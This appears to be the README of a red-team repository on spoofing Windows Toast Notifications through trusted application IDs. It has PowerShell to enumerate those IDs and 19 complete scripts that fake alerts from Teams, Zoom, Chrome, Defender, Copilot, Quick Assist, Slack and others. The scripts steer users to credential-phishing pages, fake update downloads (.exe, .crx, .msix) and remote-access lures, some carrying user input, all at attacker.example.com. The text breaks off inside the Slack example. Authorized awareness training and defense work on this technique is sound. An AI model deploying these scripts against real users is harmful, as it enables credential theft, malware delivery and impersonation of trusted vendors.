# 🍞 Toast Notifications

> **Simulate Windows Toast Notification abuse for Red Team operations, security awareness training, and social engineering assessments.**

## 📖 Overview

Windows Toast Notifications are system-level alerts that appear in the bottom-right corner of the desktop. They are delivered via the **Application User Model ID (AUMID)** a unique identifier that Windows uses to associate notifications with installed applications.

This repository documents how threat actors can **abuse trusted AUMIDs** to display spoofed notifications that impersonate Microsoft Edge, Teams, Zoom, Slack, Windows Defender, and other legitimate applications, tricking users into:

- Clicking malicious URLs
- Submitting credentials via fake portals
- Authorizing remote access
- Downloading malware disguised as updates or patches

## 🚀 Quick Start

### 1. Enumerate AUMIDs on the Target System

**Method 1 Start Menu (UWP + LNK shortcuts):**
```powershell
$uwp = Get-StartApps | Select-Object -ExpandProperty AppID
$lnk = & {
    $paths = @(
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs",
        "$env:ProgramData\Microsoft\Windows\Start Menu\Programs"
    )
    $shell = New-Object -ComObject Shell.Application
    foreach ($path in $paths) {
        Get-ChildItem $path -Recurse -Filter *.lnk -ErrorAction SilentlyContinue | ForEach-Object {
            $folder = $shell.Namespace($_.DirectoryName)
            $item   = $folder.ParseName($_.Name)
            $item.ExtendedProperty("System.AppUserModel.ID")
        }
    }
}
($uwp + $lnk) | Where-Object { $_ } | Sort-Object -Unique
```

**Method 2 AppX Packages:**
```powershell
Get-AppxPackage | Select Name, PackageFamilyName
```

**Method 3 Notification Registry Hive:**
```powershell
$notificationPaths = @(
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings"
)
$registeredApps = foreach ($path in $notificationPaths) {
    if (Test-Path $path) {
        Get-ChildItem $path | Select-Object -ExpandProperty PSChildName
    }
}
$registeredApps | Sort-Object -Unique
```

### 2. Send a Basic Toast Notification

```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime

[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

$AUMID = "MSEdge"

$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Windows Update</text>
      <text>Critical security updates have been installed.</text>
    </binding>
  </visual>
</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)

$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```

## 📋 AUMID Reference Table

| Application | AUMID |
|---|---|
| Microsoft Edge | `MSEdge` |
| Microsoft Teams | `MSTeams_8wekyb3d8bbwe!MSTeams` |
| Windows Defender | `Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI` |
| Microsoft Copilot | `Microsoft.Copilot_8wekyb3d8bbwe!App` |
| OneDrive Desktop | `Microsoft.SkyDrive.Desktop` |
| Office Hub | `Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe!Microsoft.MicrosoftOfficeHub` |
| Windows Store | `Microsoft.WindowsStore_8wekyb3d8bbwe!App` |
| Quick Assist | `MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App` |
| Phone Link | `Microsoft.YourPhone_8wekyb3d8bbwe!App` |
| Slack | `com.squirrel.slack.slack` |
| Proton Mail | `com.squirrel.proton_mail.ProtonMail` |
| VS Code | `Microsoft.VisualStudioCode` |
| Remote Desktop | `Microsoft.Windows.RemoteDesktop` |
| Windows Terminal | `Microsoft.WindowsTerminal_8wekyb3d8bbwe!App` |
| Xbox / Gaming | `Microsoft.GamingApp_8wekyb3d8bbwe!Microsoft.Xbox.App` |
| Zoom | `zoom.us.Zoom Video Meetings` |
| Chrome | `Chrome` |
| Notepad | `Microsoft.WindowsNotepad_8wekyb3d8bbwe!App` |

## 🎭 Scenario Matrix

| # | Script | AUMID | Technique | Input Type | Action |
|---|--------|-------|-----------|------------|--------|
| 01 | Windows Update basic | MSEdge | Impersonation | — | None |
| 02 | Re-authentication button | MSEdge | Credential Phishing | — | URL redirect |
| 03 | Security alert dual button | MSEdge | Credential Phishing | — | URL redirect |
| 04 | Fake update attribution | MSEdge | Malware delivery | — | URL redirect |
| 05 | Incoming call CISO | Teams | Vishing | Text input | Protocol |
| 06 | SOC incident selector | Teams | SOC Phishing | Selection | Protocol |
| 07 | HR message | Teams | Credential Phishing | Text input | Protocol |
| 08 | Urgent meeting invite | Teams | Lateral Movement | — | URL redirect |
| 09 | Deepfake video call | Teams | Vishing / Deepfake | Text input | Protocol |
| 10 | Zoom meeting in progress | Zoom | Pretexting | — | URL redirect |
| 11 | Zoom fake security update | Zoom | Malware delivery | — | URL redirect |
| 12 | Chrome Google session | Chrome | Credential Phishing | — | URL redirect |
| 13 | Chrome extension blocked | Chrome | Malware delivery | — | URL redirect |
| 14 | Defender ransomware alert | Defender | Fake AV | — | URL redirect |
| 15 | Defender license expired | Defender | Fake Expiry | — | URL redirect |
| 16 | Copilot privacy alert | Copilot | Pretexting | — | URL redirect |
| 17 | Copilot data leak | Copilot | Data Exfiltration Lure | — | URL redirect |
| 18 | OneDrive file deletion | OneDrive | Urgency / Phishing | — | URL redirect |
| 19 | Slack CEO DM fraud | Slack | BEC / CEO Fraud | — | URL redirect |
| 20 | Slack #security IOC | Slack | SOC Phishing | — | URL redirect |
| 21 | Office 365 license expired | Office Hub | Credential Phishing | — | URL redirect |
| 22 | Store fake security app | Windows Store | Malware delivery | — | URL redirect |
| 23 | Quick Assist remote access | Quick Assist | Remote Access | Text input | Protocol |
| 24 | Phone Link new device | Phone Link | Account Takeover | — | URL redirect |
| 25 | Proton Mail encrypted msg | Proton Mail | Credential Phishing | — | URL redirect |

## 📜 Scripts - All 25 Examples
 
> The WinRT loader block is identical in every script. All URLs use `attacker.example.com` as a placeholder — replace with your authorized infrastructure.
 
```powershell
# ─── WinRT Loader (required at the top of every script) ───────────────────────
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
# ─── Sender (required at the bottom of every script) ──────────────────────────
# $doc = New-Object Windows.Data.Xml.Dom.XmlDocument
# $doc.LoadXml($xml)
# $toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
# $notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
# $notifier.Show($toast)
```
 
### 01 Teams: Incoming Call from CISO
 
**AUMID:** `MSTeams_8wekyb3d8bbwe!MSTeams` · **Category:** Vishing / Impersonation
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "MSTeams_8wekyb3d8bbwe!MSTeams"
 
$xml = @"
<toast scenario="incomingCall">
  <visual>
    <binding template="ToastGeneric">
      <text>CISO — Robert Anderson</text>
      <text hint-style="subtitle">Incoming call · Microsoft Teams</text>
      <image placement="appLogoOverride" hint-crop="circle"
             src="C:\Users\Public\Pictures\ciso.jpg"/>
    </binding>
  </visual>
  <actions>
    <input id="msg" type="text" placeHolderContent="Send a message..."/>
    <action content="Answer"
            activationType="protocol"
            arguments="https://attacker.example.com/call"
            hint-inputId="msg"/>
    <action content="Decline"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 02 Teams: Active Security Incident Alert (SOC Phishing)
 
**AUMID:** `MSTeams_8wekyb3d8bbwe!MSTeams` · **Category:** SOC Phishing
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "MSTeams_8wekyb3d8bbwe!MSTeams"
 
$xml = @"
<toast scenario="urgent">
  <visual>
    <binding template="ToastGeneric">
      <text>Active Incident — IR-2024-0047</text>
      <text>Lateral movement detected on DC01. Join the immediate response room.</text>
    </binding>
  </visual>
  <actions>
    <input id="sev" type="selection" defaultInput="p1" title="Priority level">
      <selection id="p1" content="P1 — Critical"/>
      <selection id="p2" content="P2 — High"/>
      <selection id="p3" content="P3 — Medium"/>
    </input>
    <action content="Join crisis room"
            activationType="protocol"
            arguments="https://attacker.example.com/ir-room"/>
    <action content="Escalate"
            activationType="protocol"
            arguments="https://attacker.example.com/escalate"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```

### 03 Teams: HR Message with Text Input (Credential Harvesting)
 
**AUMID:** `MSTeams_8wekyb3d8bbwe!MSTeams` · **Category:** Credential Phishing
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "MSTeams_8wekyb3d8bbwe!MSTeams"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Human Resources · Teams</text>
      <text>To complete your enrollment in the new payroll system, please confirm your employee ID.</text>
    </binding>
  </visual>
  <actions>
    <input id="empid" type="text" placeHolderContent="Enter your employee ID..."/>
    <action content="Confirm"
            activationType="protocol"
            arguments="https://attacker.example.com/collect"
            hint-inputId="empid"/>
    <action content="Later"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 04 Teams: Urgent Meeting Invite (Lateral Movement)
 
**AUMID:** `MSTeams_8wekyb3d8bbwe!MSTeams` · **Category:** Lateral Movement
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "MSTeams_8wekyb3d8bbwe!MSTeams"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Q4 Budget Review — In Progress</text>
      <text>Meeting started 8 minutes ago. The CEO is waiting for you to join.</text>
      <text placement="attribution">Microsoft Teams</text>
    </binding>
  </visual>
  <actions>
    <action content="Join now"
            activationType="protocol"
            arguments="https://attacker.example.com/meeting/q4"/>
    <action content="Decline"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 05 Teams: Deepfake Video Call
 
**AUMID:** `MSTeams_8wekyb3d8bbwe!MSTeams` · **Category:** Vishing / Deepfake
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "MSTeams_8wekyb3d8bbwe!MSTeams"
 
$xml = @"
<toast scenario="incomingCall">
  <visual>
    <binding template="ToastGeneric">
      <text>CEO — Sophia Williams</text>
      <text hint-style="subtitle">Incoming video call · Urgent</text>
      <image placement="appLogoOverride" hint-crop="circle"
             src="C:\Users\Public\Pictures\ceo.jpg"/>
    </binding>
  </visual>
  <actions>
    <input id="msg" type="text" placeHolderContent="Message..."/>
    <action content="Answer video call"
            activationType="protocol"
            arguments="https://attacker.example.com/deepfake-call"
            hint-inputId="msg"/>
    <action content="Decline"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 06 Zoom: Meeting In Progress Without You
 
**AUMID:** `zoom.us.Zoom Video Meetings` · **Category:** Urgency / Pretexting
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "zoom.us.Zoom Video Meetings"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Meeting in progress — Board Review Q4</text>
      <text>The meeting started 8 minutes ago. The CEO is waiting for your connection.</text>
      <text placement="attribution">Zoom Video Meetings</text>
    </binding>
  </visual>
  <actions>
    <action content="Join now"
            activationType="protocol"
            arguments="https://attacker.example.com/zoom/board-q4"/>
    <action content="Decline invitation"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 07 Zoom: Critical Security Update Required
 
**AUMID:** `zoom.us.Zoom Video Meetings` · **Category:** Fake Update / Malware Delivery
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "zoom.us.Zoom Video Meetings"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Zoom — Critical Security Update Required</text>
      <text>Your current version has a critical vulnerability (CVE-2024-XXXX). Update immediately to stay protected.</text>
    </binding>
  </visual>
  <actions>
    <action content="Update Zoom now"
            activationType="protocol"
            arguments="https://attacker.example.com/zoom-update.exe"/>
    <action content="Dismiss (not recommended)"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 08 Chrome: Google Workspace Session Expired
 
**AUMID:** `Chrome` · **Category:** Credential Phishing
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "Chrome"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Google Chrome — Session Expired</text>
      <text>Your Google Workspace account has been signed out. Click to re-authenticate.</text>
      <text placement="attribution">Google Chrome</text>
    </binding>
  </visual>
  <actions>
    <action content="Sign in"
            activationType="protocol"
            arguments="https://attacker.example.com/google-auth"/>
    <action content="Remind me later"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 09 Chrome: Corporate Security Extension Blocked
 
**AUMID:** `Chrome` · **Category:** Fake Extension / Malware Delivery
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "Chrome"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Chrome — Extension Blocked by IT Policy</text>
      <text>The corporate security extension has been disabled. Reinstall it to maintain endpoint protection.</text>
    </binding>
  </visual>
  <actions>
    <action content="Reinstall extension"
            activationType="protocol"
            arguments="https://attacker.example.com/extension.crx"/>
    <action content="Dismiss"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 10 Windows Defender: Ransomware Blocked
 
**AUMID:** `Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI` · **Category:** Fake AV Alert
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI"
 
$xml = @"
<toast scenario="urgent">
  <visual>
    <binding template="ToastGeneric">
      <text>Windows Defender — Ransomware Blocked</text>
      <text>Lockbit.3 detected in C:\Users\Documents. Install emergency patch KB5041578 immediately.</text>
    </binding>
  </visual>
  <actions>
    <action content="Install patch now"
            activationType="protocol"
            arguments="https://attacker.example.com/kb5041578.exe"/>
    <action content="View full report"
            activationType="protocol"
            arguments="https://attacker.example.com/report"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 11 Windows Defender: Protection License Expired
 
**AUMID:** `Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI` · **Category:** Fake Expiry
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Protection Disabled — Action Required</text>
      <text>Your corporate security license has expired. Your device is unprotected. Renew now.</text>
    </binding>
  </visual>
  <actions>
    <action content="Renew license"
            activationType="protocol"
            arguments="https://attacker.example.com/renew"/>
    <action content="More information"
            activationType="protocol"
            arguments="https://attacker.example.com/info"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 12 Microsoft Copilot: Unauthorized Data Access
 
**AUMID:** `Microsoft.Copilot_8wekyb3d8bbwe!App` · **Category:** Pretexting
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "Microsoft.Copilot_8wekyb3d8bbwe!App"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Microsoft Copilot — Privacy Alert</text>
      <text>Your confidential documents were processed by an unauthorized external model. Review access now.</text>
    </binding>
  </visual>
  <actions>
    <action content="Review access log"
            activationType="protocol"
            arguments="https://attacker.example.com/privacy-review"/>
    <action content="Revoke permissions"
            activationType="protocol"
            arguments="https://attacker.example.com/revoke"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 13 Microsoft Copilot: Data Leak Detected
 
**AUMID:** `Microsoft.Copilot_8wekyb3d8bbwe!App` · **Category:** Data Exfiltration Lure
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "Microsoft.Copilot_8wekyb3d8bbwe!App"
 
$xml = @"
<toast scenario="urgent">
  <visual>
    <binding template="ToastGeneric">
      <text>Microsoft Copilot — Potential Data Leak</text>
      <text>Copilot detected that your organization's data has been referenced in a public dataset. Review now.</text>
    </binding>
  </visual>
  <actions>
    <action content="Review exposure"
            activationType="protocol"
            arguments="https://attacker.example.com/data-leak"/>
    <action content="Report to IT"
            activationType="protocol"
            arguments="https://attacker.example.com/report-it"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 14 OneDrive Desktop: Files Pending Deletion
 
**AUMID:** `Microsoft.SkyDrive.Desktop` · **Category:** Urgency / Phishing
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "Microsoft.SkyDrive.Desktop"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>OneDrive — Files Pending Deletion</text>
      <text>23 files will be permanently deleted in 2 hours due to the data retention policy. Save them now.</text>
      <text placement="attribution">Microsoft OneDrive</text>
    </binding>
  </visual>
  <actions>
    <action content="Save files"
            activationType="protocol"
            arguments="https://attacker.example.com/onedrive-save"/>
    <action content="View affected files"
            activationType="protocol"
            arguments="https://attacker.example.com/onedrive-list"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 15 Office Hub: Microsoft 365 License Expired
 
**AUMID:** `Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe!Microsoft.MicrosoftOfficeHub` · **Category:** Credential Phishing
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe!Microsoft.MicrosoftOfficeHub"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Microsoft 365 — License Expired</text>
      <text>Your Microsoft 365 Business subscription has expired. Renew to continue accessing Word, Excel, and Teams.</text>
      <text placement="attribution">Microsoft Office</text>
    </binding>
  </visual>
  <actions>
    <action content="Renew now"
            activationType="protocol"
            arguments="https://attacker.example.com/m365-renew"/>
    <action content="Contact IT"
            activationType="protocol"
            arguments="https://attacker.example.com/it-contact"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 16 Windows Store: Mandatory IT Security App
 
**AUMID:** `Microsoft.WindowsStore_8wekyb3d8bbwe!App` · **Category:** Fake App / Malware Delivery
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "Microsoft.WindowsStore_8wekyb3d8bbwe!App"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Microsoft Store — IT-Recommended Application</text>
      <text>IT has published "Corporate Security Agent 2.1". Mandatory installation required before Friday.</text>
    </binding>
  </visual>
  <actions>
    <action content="Install now"
            activationType="protocol"
            arguments="https://attacker.example.com/security-agent.msix"/>
    <action content="Schedule installation"
            activationType="protocol"
            arguments="https://attacker.example.com/schedule"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 17 Quick Assist: IT Remote Support Request
 
**AUMID:** `MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App` · **Category:** Remote Access / Lateral Movement
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Quick Assist — Remote Support Request</text>
      <text>Technician Mark L. (IT-Helpdesk) needs remote access to complete the security update on your device.</text>
    </binding>
  </visual>
  <actions>
    <input id="code" type="text" placeHolderContent="Enter the session code..."/>
    <action content="Authorize connection"
            activationType="protocol"
            arguments="https://attacker.example.com/remote-session"
            hint-inputId="code"/>
    <action content="Decline"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 18 Phone Link: Unknown Device Linked
 
**AUMID:** `Microsoft.YourPhone_8wekyb3d8bbwe!App` · **Category:** Account Takeover
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "Microsoft.YourPhone_8wekyb3d8bbwe!App"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Phone Link — New Device Linked</text>
      <text>An unknown device "Samsung SM-G998B" has been linked to your account. Was this you?</text>
    </binding>
  </visual>
  <actions>
    <action content="That wasn't me — Secure account"
            activationType="protocol"
            arguments="https://attacker.example.com/account-recovery"/>
    <action content="Yes, that was me"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 19 Slack: CEO Direct Message Fraud (BEC)
 
**AUMID:** `com.squirrel.slack.slack` · **Category:** BEC / CEO Fraud
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "com.squirrel.slack.slack"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Slack · DM from James Carter (CEO)</text>
